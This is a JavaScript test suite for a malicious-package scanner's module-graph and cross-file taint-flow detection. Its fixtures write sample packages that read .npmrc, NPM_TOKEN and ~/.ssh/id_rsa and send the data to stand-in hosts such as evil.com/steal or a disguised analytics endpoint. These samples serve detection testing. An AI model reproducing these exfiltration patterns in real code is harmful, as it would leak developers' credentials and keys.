const fs = require('fs');
const path = require('path');
const os = require('os');
const { test, assert, assertIncludes, assertNotIncludes, runScan } = require('../test-utils');
const { buildModuleGraph, annotateTaintedExports, detectCrossFileFlows, annotateSinkExports, detectCallbackCrossFileFlows } = require('../../src/scanner/module-graph');

function makeTmpDir() {
  return fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-modgraph-'));
}

function cleanup(dir) {
  fs.rmSync(dir, { recursive: true, force: true });
}

function writeFile(dir, rel, content) {
  const abs = path.join(dir, rel);
  fs.mkdirSync(path.dirname(abs), { recursive: true });
  fs.writeFileSync(abs, content);
}

async function runModuleGraphTests() {
  console.log('\n=== Module Graph Tests ===\n');

  // =========================================================================
  // STEP 1 — buildModuleGraph
  // =========================================================================

  test('module-graph: 3 files with local imports produce correct graph', () => {
    const tmp = makeTmpDir();
    try {
      writeFile(tmp, 'index.js', `
        const reader = require('./reader');
        const sender = require('./sender');
        reader.read();
        sender.send();
      `);
      writeFile(tmp, 'reader.js', `
        module.exports = { read() { return 'data'; } };
      `);
      writeFile(tmp, 'sender.js', `
        const reader = require('./reader');
        module.exports = { send() { reader.read(); } };
      `);

      const graph = buildModuleGraph(tmp);

      assert(Array.isArray(graph['index.js']), 'index.js should be in graph');
      assert(graph['index.js'].includes('reader.js'), 'index.js should import reader.js');
      assert(graph['index.js'].includes('sender.js'), 'index.js should import sender.js');
      assert(graph['index.js'].length === 2, 'index.js should have exactly 2 imports');

      assert(Array.isArray(graph['reader.js']), 'reader.js should be in graph');
      assert(graph['reader.js'].length === 0, 'reader.js should have 0 imports');

      assert(Array.isArray(graph['sender.js']), 'sender.js should be in graph');
      assert(graph['sender.js'].includes('reader.js'), 'sender.js should import reader.js');
      assert(graph['sender.js'].length === 1, 'sender.js should have exactly 1 import');
    } finally {
      cleanup(tmp);
    }
  });

  test('module-graph: node_module require is not included in graph edges', () => {
    const tmp = makeTmpDir();
    try {
      writeFile(tmp, 'index.js', `
        const fs = require('fs');
        const http = require('http');
        const axios = require('axios');
        const local = require('./helper');
      `);
      writeFile(tmp, 'helper.js', `module.exports = {};`);

      const graph = buildModuleGraph(tmp);

      assert(graph['index.js'].length === 1, 'index.js should have exactly 1 local import');
      assert(graph['index.js'].includes('helper.js'), 'index.js should import helper.js');
    } finally {
      cleanup(tmp);
    }
  });

  test('module-graph: dynamic require(variable) is ignored', () => {
    const tmp = makeTmpDir();
    try {
      writeFile(tmp, 'index.js', `
        const name = './helper';
        const mod = require(name);
        const other = require('./utils');
      `);
      writeFile(tmp, 'helper.js', `module.exports = {};`);
      writeFile(tmp, 'utils.js', `module.exports = {};`);

      const graph = buildModuleGraph(tmp);

      assert(graph['index.js'].length === 1, 'index.js should have exactly 1 import (dynamic ignored)');
      assert(graph['index.js'].includes('utils.js'), 'index.js should import utils.js');
    } finally {
      cleanup(tmp);
    }
  });

  test('module-graph: require of non-existent file is ignored without crash', () => {
    const tmp = makeTmpDir();
    try {
      writeFile(tmp, 'index.js', `
        const missing = require('./does-not-exist');
        const local = require('./helper');
      `);
      writeFile(tmp, 'helper.js', `module.exports = {};`);

      const graph = buildModuleGraph(tmp);

      assert(graph['index.js'].length === 1, 'index.js should have 1 import (missing file ignored)');
      assert(graph['index.js'].includes('helper.js'), 'index.js should import helper.js');
    } finally {
      cleanup(tmp);
    }
  });

  test('module-graph: single file with no imports has empty edges', () => {
    const tmp = makeTmpDir();
    try {
      writeFile(tmp, 'index.js', `
        console.log('hello');
        function foo() { return 42; }
        module.exports = foo;
      `);

      const graph = buildModuleGraph(tmp);

      assert(Array.isArray(graph['index.js']), 'index.js should be in graph');
      assert(graph['index.js'].length === 0, 'index.js should have 0 imports');
    } finally {
      cleanup(tmp);
    }
  });

  // =========================================================================
  // STEP 2 — annotateTaintedExports
  // =========================================================================

  test('tainted-exports: module exporting fs.readFileSync(.npmrc) is tainted', () => {
    const tmp = makeTmpDir();
    try {
      writeFile(tmp, 'reader.js', `
        const fs = require('fs');
        const data = fs.readFileSync('.npmrc', 'utf8');
        module.exports = data;
      `);

      const graph = buildModuleGraph(tmp);
      const tainted = annotateTaintedExports(graph, tmp);

      assert(tainted['reader.js'], 'reader.js should be in taintedExports');
      assert(tainted['reader.js']['default'], 'reader.js should have default export');
      assert(tainted['reader.js']['default'].tainted === true, 'default export should be tainted');
      assert(tainted['reader.js']['default'].source === 'fs.readFileSync', 'source should be fs.readFileSync');
      assert(tainted['reader.js']['default'].detail === '.npmrc', 'detail should be .npmrc');
    } finally {
      cleanup(tmp);
    }
  });

  test('tainted-exports: module exporting process.env.NPM_TOKEN is tainted', () => {
    const tmp = makeTmpDir();
    try {
      writeFile(tmp, 'utils.js', `
        exports.getToken = process.env.NPM_TOKEN;
      `);

      const graph = buildModuleGraph(tmp);
      const tainted = annotateTaintedExports(graph, tmp);

      assert(tainted['utils.js'], 'utils.js should be in taintedExports');
      assert(tainted['utils.js']['getToken'], 'utils.js should have getToken export');
      assert(tainted['utils.js']['getToken'].tainted === true, 'getToken should be tainted');
      assert(tainted['utils.js']['getToken'].source === 'process.env', 'source should be process.env');
      assert(tainted['utils.js']['getToken'].detail === 'NPM_TOKEN', 'detail should be NPM_TOKEN');
    } finally {
      cleanup(tmp);
    }
  });

  test('tainted-exports: module exporting os.homedir + readFile is tainted', () => {
    const tmp = makeTmpDir();
    try {
      writeFile(tmp, 'stealer.js', `
        const os = require('os');
        const fs = require('fs');
        module.exports = {
          steal: function() {
            const home = os.homedir();
            const data = fs.readFileSync(home + '/.ssh/id_rsa', 'utf8');
            return data;
          }
        };
      `);

      const graph = buildModuleGraph(tmp);
      const tainted = annotateTaintedExports(graph, tmp);

      assert(tainted['stealer.js'], 'stealer.js should be in taintedExports');
      assert(tainted['stealer.js']['steal'], 'stealer.js should have steal export');
      assert(tainted['stealer.js']['steal'].tainted === true, 'steal should be tainted');
      // Should detect either os.homedir or fs.readFileSync — both are sensitive
      const src = tainted['stealer.js']['steal'].source;
      assert(src === 'os.homedir' || src === 'fs.readFileSync', 'source should be os.homedir or fs.readFileSync, got: ' + src);
    } finally {
      cleanup(tmp);
    }
  });

  test('tainted-exports: module exporting constant string is NOT tainted', () => {
    const tmp = makeTmpDir();
    try {
      writeFile(tmp, 'config.js', `
        module.exports = {
          name: 'my-package',
          version: '1.0.0',
          greeting: 'hello world'
        };
      `);

      const graph = buildModuleGraph(tmp);
      const tainted = annotateTaintedExports(graph, tmp);

      assert(tainted['config.js'], 'config.js should be in taintedExports');
      const exports = tainted['config.js'];
      const hasTainted = Object.values(exports).some(e => e.tainted);
      assert(!hasTainted, 'config.js should have no tainted exports');
    } finally {
      cleanup(tmp);
    }
  });

  test('tainted-exports: module exporting math calculation is NOT tainted', () => {
    const tmp = makeTmpDir();
    try {
      writeFile(tmp, 'math.js', `
        function add(a, b) { return a + b; }
        function multiply(a, b) { return a * b; }
        module.exports = { add, multiply };
      `);

      const graph = buildModuleGraph(tmp);
      const tainted = annotateTaintedExports(graph, tmp);

      assert(tainted['math.js'], 'math.js should be in taintedExports');
      const exports = tainted['math.js'];
      const hasTainted = Object.values(exports).some(e => e.tainted);
      assert(!hasTainted, 'math.js should have no tainted exports');
    } finally {
      cleanup(tmp);
    }
  });

  // =========================================================================
  // STEP 3 — detectCrossFileFlows
  // =========================================================================

  test('cross-file: reader exports readFileSync(.npmrc), sender requires + fetch → CRITICAL', () => {
    const tmp = makeTmpDir();
    try {
      writeFile(tmp, 'reader.js', `
        const fs = require('fs');
        const data = fs.readFileSync('.npmrc', 'utf8');
        module.exports = data;
      `);
      writeFile(tmp, 'sender.js', `
        const data = require('./reader');
        fetch('https://evil.com/steal', { body: data });
      `);

      const graph = buildModuleGraph(tmp);
      const tainted = annotateTaintedExports(graph, tmp);
      const flows = detectCrossFileFlows(graph, tainted, tmp);

      assert(flows.length >= 1, 'Should detect at least 1 cross-file flow, got: ' + flows.length);
      const flow = flows[0];
      assert(flow.severity === 'CRITICAL', 'Severity should be CRITICAL');
      assert(flow.type === 'cross_file_dataflow', 'Type should be cross_file_dataflow');
      assert(flow.sourceFile === 'reader.js', 'Source file should be reader.js');
      assert(flow.sinkFile === 'sender.js', 'Sink file should be sender.js');
      assert(flow.sink.includes('fetch'), 'Sink should include fetch');
      assert(flow.source.includes('fs.readFileSync'), 'Source should include fs.readFileSync');
    } finally {
      cleanup(tmp);
    }
  });

  test('cross-file: 3-file chain reader → utils → sender detected', () => {
    const tmp = makeTmpDir();
    try {
      writeFile(tmp, 'reader.js', `
        const fs = require('fs');
        const token = fs.readFileSync('.npmrc', 'utf8');
        module.exports = token;
      `);
      writeFile(tmp, 'utils.js', `
        const token = require('./reader');
        module.exports = token;
      `);
      writeFile(tmp, 'sender.js', `
        const data = require('./utils');
        fetch('https://evil.com', { body: data });
      `);

      const graph = buildModuleGraph(tmp);
      const tainted = annotateTaintedExports(graph, tmp);
      const flows = detectCrossFileFlows(graph, tainted, tmp);

      assert(flows.length >= 1, 'Should detect cross-file flow through chain, got: ' + flows.length);
      const flow = flows.find(f => f.sinkFile === 'sender.js');
      assert(flow, 'Should have a flow ending in sender.js');
      assert(flow.severity === 'CRITICAL', 'Severity should be CRITICAL');
      assert(flow.sink.includes('fetch'), 'Sink should include fetch');
    } finally {
      cleanup(tmp);
    }
  });

  test('cross-file: named tainted export + destructuring import + sink detected', () => {
    const tmp = makeTmpDir();
    try {
      writeFile(tmp, 'creds.js', `
        exports.getToken = process.env.NPM_TOKEN;
      `);
      writeFile(tmp, 'exfil.js', `
        const { getToken } = require('./creds');
        const https = require('https');
        https.request('https://evil.com', { body: getToken });
      `);

      const graph = buildModuleGraph(tmp);
      const tainted = annotateTaintedExports(graph, tmp);
      const flows = detectCrossFileFlows(graph, tainted, tmp);

      assert(flows.length >= 1, 'Should detect flow from named export, got: ' + flows.length);
      const flow = flows[0];
      assert(flow.severity === 'CRITICAL', 'Severity should be CRITICAL');
      assert(flow.sourceFile === 'creds.js', 'Source should be creds.js');
      assert(flow.sinkFile === 'exfil.js', 'Sink should be exfil.js');
    } finally {
      cleanup(tmp);
    }
  });

  test('cross-file: two independent modules without flow → no finding', () => {
    const tmp = makeTmpDir();
    try {
      writeFile(tmp, 'reader.js', `
        const fs = require('fs');
        module.exports = fs.readFileSync('.npmrc', 'utf8');
      `);
      writeFile(tmp, 'sender.js', `
        const msg = 'hello';
        fetch('https://example.com', { body: msg });
      `);

      const graph = buildModuleGraph(tmp);
      const tainted = annotateTaintedExports(graph, tmp);
      const flows = detectCrossFileFlows(graph, tainted, tmp);

      assert(flows.length === 0, 'Should have no cross-file flows, got: ' + flows.length);
    } finally {
      cleanup(tmp);
    }
  });

  test('cross-file: import of clean module + sink → no finding', () => {
    const tmp = makeTmpDir();
    try {
      writeFile(tmp, 'config.js', `
        module.exports = { url: 'https://example.com', name: 'test' };
      `);
      writeFile(tmp, 'sender.js', `
        const config = require('./config');
        fetch(config.url, { body: 'hello' });
      `);

      const graph = buildModuleGraph(tmp);
      const tainted = annotateTaintedExports(graph, tmp);
      const flows = detectCrossFileFlows(graph, tainted, tmp);

      assert(flows.length === 0, 'Should have no flows when importing clean module, got: ' + flows.length);
    } finally {
      cleanup(tmp);
    }
  });

  // =========================================================================
  // STEP 4 — Integration tests (CLI scan)
  // =========================================================================

  test('integration: CLI scan detects cross_file_dataflow in malicious package', () => {
    const tmp = makeTmpDir();
    try {
      writeFile(tmp, 'package.json', JSON.stringify({ name: 'evil-pkg', version: '1.0.0' }));
      writeFile(tmp, 'reader.js', `
        const fs = require('fs');
        const data = fs.readFileSync('.npmrc', 'utf8');
        module.exports = data;
      `);
      writeFile(tmp, 'sender.js', `
        const data = require('./reader');
        fetch('https://evil.com/steal', { body: data });
      `);

      const output = runScan(tmp, '--json');
      const result = JSON.parse(output);
      const crossFileThreats = result.threats.filter(t => t.type === 'cross_file_dataflow');
      assert(crossFileThreats.length >= 1, 'Should detect at least 1 cross_file_dataflow threat, got: ' + crossFileThreats.length);
      assert(crossFileThreats[0].severity === 'CRITICAL', 'Severity should be CRITICAL');
      assertIncludes(crossFileThreats[0].message, 'reader.js', 'Message should mention reader.js');
      assertIncludes(crossFileThreats[0].message, 'sender.js', 'Message should mention sender.js');
      assert(crossFileThreats[0].rule_id === 'MUADDIB-FLOW-004', 'Rule ID should be MUADDIB-FLOW-004, got: ' + crossFileThreats[0].rule_id);
    } finally {
      cleanup(tmp);
    }
  });

  test('integration: CLI scan on clean package produces no cross_file_dataflow', () => {
    const tmp = makeTmpDir();
    try {
      writeFile(tmp, 'package.json', JSON.stringify({ name: 'clean-pkg', version: '1.0.0' }));
      writeFile(tmp, 'utils.js', `
        function add(a, b) { return a + b; }
        module.exports = { add };
      `);
      writeFile(tmp, 'index.js', `
        const { add } = require('./utils');
        console.log(add(1, 2));
      `);

      const output = runScan(tmp, '--json');
      const result = JSON.parse(output);
      const crossFileThreats = result.threats.filter(t => t.type === 'cross_file_dataflow');
      assert(crossFileThreats.length === 0, 'Should have no cross_file_dataflow threats, got: ' + crossFileThreats.length);
    } finally {
      cleanup(tmp);
    }
  });

  // =========================================================================
  // ES Module import/export support (Fix 3)
  // =========================================================================

  test('ES module: export function with fs.readFileSync + import { read } + fetch → cross_file_dataflow', () => {
    const tmp = makeTmpDir();
    try {
      writeFile(tmp, 'package.json', JSON.stringify({ name: 'esm-pkg', version: '1.0.0' }));
      writeFile(tmp, 'reader.mjs', `
        import fs from 'fs';
        export function read() {
          return fs.readFileSync('.npmrc', 'utf8');
        }
      `);
      writeFile(tmp, 'sender.mjs', `
        import { read } from './reader';
        const data = read();
        fetch('https://evil.com/steal', { body: data });
      `);

      const graph = buildModuleGraph(tmp);
      const tainted = annotateTaintedExports(graph, tmp);
      const flows = detectCrossFileFlows(graph, tainted, tmp);

      assert(flows.length >= 1, 'Should detect ES module cross-file flow, got: ' + flows.length);
      const flow = flows[0];
      assert(flow.severity === 'CRITICAL', 'Severity should be CRITICAL');
      assert(flow.type === 'cross_file_dataflow', 'Type should be cross_file_dataflow');
    } finally {
      cleanup(tmp);
    }
  });

  test('ES module: export default arrow with process.env + import getData + fetch → cross_file_dataflow', () => {
    const tmp = makeTmpDir();
    try {
      writeFile(tmp, 'package.json', JSON.stringify({ name: 'esm-pkg2', version: '1.0.0' }));
      writeFile(tmp, 'reader.mjs', `
        export default () => process.env.NPM_TOKEN;
      `);
      writeFile(tmp, 'sender.mjs', `
        import getData from './reader';
        const token = getData();
        fetch('https://evil.com', { body: token });
      `);

      const graph = buildModuleGraph(tmp);
      const tainted = annotateTaintedExports(graph, tmp);
      const flows = detectCrossFileFlows(graph, tainted, tmp);

      assert(flows.length >= 1, 'Should detect ES module default export flow, got: ' + flows.length);
      assert(flows[0].severity === 'CRITICAL', 'Severity should be CRITICAL');
    } finally {
      cleanup(tmp);
    }
  });

  test('ES module: export const token = process.env.NPM_TOKEN + import { token } + fetch → cross_file_dataflow', () => {
    const tmp = makeTmpDir();
    try {
      writeFile(tmp, 'package.json', JSON.stringify({ name: 'esm-pkg3', version: '1.0.0' }));
      writeFile(tmp, 'config.mjs', `
        export const token = process.env.NPM_TOKEN;
      `);
      writeFile(tmp, 'sender.mjs', `
        import { token } from './config';
        fetch('https://evil.com', { body: token });
      `);

      const graph = buildModuleGraph(tmp);
      const tainted = annotateTaintedExports(graph, tmp);
      const flows = detectCrossFileFlows(graph, tainted, tmp);

      assert(flows.length >= 1, 'Should detect ES module named const export flow, got: ' + flows.length);
      assert(flows[0].severity === 'CRITICAL', 'Severity should be CRITICAL');
    } finally {
      cleanup(tmp);
    }
  });

  test('ES module: export function returning safe string → no tainted export', () => {
    const tmp = makeTmpDir();
    try {
      writeFile(tmp, 'safe.mjs', `
        export function safe() { return 'hello'; }
        export const version = '1.0.0';
      `);

      const graph = buildModuleGraph(tmp);
      const tainted = annotateTaintedExports(graph, tmp);

      const exports = tainted['safe.mjs'] || {};
      const hasTainted = Object.values(exports).some(e => e.tainted);
      assert(!hasTainted, 'Safe ES module should have no tainted exports');
    } finally {
      cleanup(tmp);
    }
  });

  // =========================================================================
  // STEP 5 — Callback-based cross-file flow detection
  // =========================================================================

  test('callback-flow: reader exports tainted fn, sender exports sink fn, index connects via callback → CRITICAL', () => {
    const tmp = makeTmpDir();
    try {
      writeFile(tmp, 'package.json', JSON.stringify({ name: 'callback-pkg', version: '1.0.0' }));
      writeFile(tmp, 'reader.js', `
        const fs = require('fs');
        const os = require('os');
        const path = require('path');
        function readConfig(callback) {
          const configDir = os.homedir();
          const npmrc = path.join(configDir, '.npmrc');
          try {
            const data = fs.readFileSync(npmrc, 'utf8');
            callback(null, data);
          } catch (err) {
            callback(err, null);
          }
        }
        module.exports = { readConfig };
      `);
      writeFile(tmp, 'sender.js', `
        const https = require('https');
        function reportData(payload) {
          const req = https.request({
            hostname: 'analytics-hub.io',
            path: '/v2/report',
            method: 'POST'
          });
          req.write(payload);
          req.end();
        }
        module.exports = { reportData };
      `);
      writeFile(tmp, 'index.js', `
        const { readConfig } = require('./reader');
        const { reportData } = require('./sender');
        readConfig(function(err, data) {
          if (!err && data) {
            reportData(data);
          }
        });
      `);

      const graph = buildModuleGraph(tmp);
      const tainted = annotateTaintedExports(graph, tmp);
      const sinks = annotateSinkExports(graph, tmp);
      const flows = detectCallbackCrossFileFlows(graph, tainted, sinks, tmp);

      assert(flows.length >= 1, 'Should detect callback-based cross-file flow, got: ' + flows.length);
      const flow = flows[0];
      assert(flow.severity === 'CRITICAL', 'Severity should be CRITICAL');
      assert(flow.type === 'cross_file_dataflow', 'Type should be cross_file_dataflow');
      assertIncludes(flow.description, 'callback', 'Description should mention callback');
    } finally {
      cleanup(tmp);
    }
  });

  test('callback-flow: no false positive when importing clean functions', () => {
    const tmp = makeTmpDir();
    try {
      writeFile(tmp, 'package.json', JSON.stringify({ name: 'clean-pkg', version: '1.0.0' }));
      writeFile(tmp, 'math.js', `
        function add(a, b, callback) {
          callback(null, a + b);
        }
        module.exports = { add };
      `);
      writeFile(tmp, 'logger.js', `
        function log(msg) {
          console.log(msg);
        }
        module.exports = { log };
      `);
      writeFile(tmp, 'index.js', `
        const { add } = require('./math');
        const { log } = require('./logger');
        add(1, 2, function(err, result) {
          log(result);
        });
      `);

      const graph = buildModuleGraph(tmp);
      const tainted = annotateTaintedExports(graph, tmp);
      const sinks = annotateSinkExports(graph, tmp);
      const flows = detectCallbackCrossFileFlows(graph, tainted, sinks, tmp);

      assert(flows.length === 0, 'Should have no callback flows for clean package, got: ' + flows.length);
    } finally {
      cleanup(tmp);
    }
  });

  test('tainted-exports: shorthand property referencing FunctionDeclaration is tainted', () => {
    const tmp = makeTmpDir();
    try {
      writeFile(tmp, 'reader.js', `
        const fs = require('fs');
        const os = require('os');
        function readConfig() {
          return fs.readFileSync(os.homedir() + '/.npmrc', 'utf8');
        }
        module.exports = { readConfig };
      `);

      const graph = buildModuleGraph(tmp);
      const tainted = annotateTaintedExports(graph, tmp);

      assert(tainted['reader.js'], 'reader.js should be in taintedExports');
      assert(tainted['reader.js']['readConfig'], 'reader.js should have readConfig export');
      assert(tainted['reader.js']['readConfig'].tainted === true, 'readConfig should be tainted');
    } finally {
      cleanup(tmp);
    }
  });
}

module.exports = { runModuleGraphTests };
